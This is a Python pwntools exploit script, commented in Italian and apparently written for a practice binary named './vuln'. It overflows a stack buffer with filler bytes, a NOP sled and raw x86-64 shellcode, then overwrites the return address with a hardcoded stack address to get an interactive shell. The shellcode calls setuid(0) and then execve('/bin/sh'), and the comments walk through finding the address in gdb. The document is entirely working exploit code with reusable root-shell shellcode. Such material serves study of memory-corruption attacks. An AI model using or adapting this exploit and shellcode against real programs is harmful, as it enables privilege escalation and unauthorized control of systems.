from pwn import *
import sys

p= gdb.debug('./vuln', 'b main')

# per puntare ad un indirizzo che contine nops e far eseguire poi lo shellcode
nops = b'\x90'*40

#se lo shellcode necessita di spazio per il salvataggio di valori in memoria
padding = b'\x55'*40

#shellcode per eseguire /bin/sh
shellcode = b"\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c\x58\x0f\x05"

#hop 408 bytes prima di raggiungere rsp quindi devo usare questo spazio per inserire lo shell_code
buf = b'\x55' * (408 - len(nops) - len(padding) - len(shellcode))


#uso inizialmente per trovare l'indirizzo di una nop
return_address = b'\x55'*8

#con gdb avvio la prima volta e metto un breakpoint su leave di vuln() 
#faccio c e c per arrivare al break di vuln
#  x/300gx $rsp   e trovo l'indirizzo in cui vengono messe le nop, deve contenere x9090909090909090
return_address = p64(0x7fffffffde80)

#esegue lo shellcode
p.sendline(buf + nops + shellcode + padding + return_address)

p.interactive()